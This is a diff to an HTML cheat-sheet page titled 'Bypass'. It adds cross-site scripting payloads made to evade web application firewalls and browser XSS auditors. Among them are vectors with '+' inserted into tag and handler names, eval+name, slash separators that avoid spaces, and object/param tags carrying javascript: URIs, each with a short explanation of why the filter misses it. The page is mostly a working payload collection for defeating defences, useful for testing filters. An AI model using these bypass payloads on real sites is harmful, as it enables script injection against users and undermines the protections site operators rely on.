@@ -3,8 +3,13 @@
 <head>
 <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
 <title>Bypass</title>
-</head><body>By adding “+”, usually parsed as white spaces by applications, in strategic places of vector/payload, both security solutions fail because of stripping of a single character. No WAF can see this as a XSS attack because “&lt;” is not immediately followed by a alphabetic character and Auditor can’t see this as similar enough to what is reflected in source, the way this solution uses to catch XSS attempts.<br/>
+</head><body><b>By adding “+”, usually parsed as white spaces by applications</b>, in strategic places of vector/payload, both security solutions fail because of stripping of a single character. No WAF can see this as a XSS attack because “&lt;” is not immediately followed by a alphabetic character and Auditor can’t see this as similar enough to what is reflected in source, the way this solution uses to catch XSS attempts. Additionally, underlying server/application must join parameters somehow (ASP, ASP.NET on IIS) so these attacks are more viable.<br/>
 &lt;+svg/o+nload=al+ert+(1)&gt;<br/>
+eval+name<br/>
+&lt;script+&amp;injection=&gt;alert(1)&gt;&lt;/script&gt;<br/>
+<br/>
+/ in HTML or nothing after quoted attributes to bypass space filter<br/>
+&lt;img/src="mars.png"alt="mars"&gt;<br/>
 <br/>
 <b>Use of `` to for <a href="https://en.wikipedia.org/wiki/ECMAScript">ES6</a>&nbsp;way to enclose javascript strings</b><br/>
 &lt;svg+onload=`&lt;script`-alert(1)&gt;<br/>
@@ -61,4 +66,11 @@ Attempt to use special encoding: x09 (tab), x0A (new line), x0D (carriage return
 Go deeper, tags within tags! or direct references<br/>
 &lt;a&amp;xss=&lt;x:vmlframe src=payload&gt;<br/>
 '&amp;js_xss=";alert(0)//<br/>
-";x:[document.URL='jav\x61script:alert\x280)']//</body></html>
+";x:[document.URL='jav\x61script:alert\x280)']//<br/>
+<br/>
+<b>HTML full param definition</b><br/>
+&lt;object&gt;&lt;param name="src" value= "javascript:alert(0)"&gt;&lt;/param&gt;&lt;/object&gt;<br/>
+<br/>
+<b>HTML filtered on 'src'<br/>
+</b>&lt;object data="javascript:alert(0)"&gt;<br/>
+</body></html>
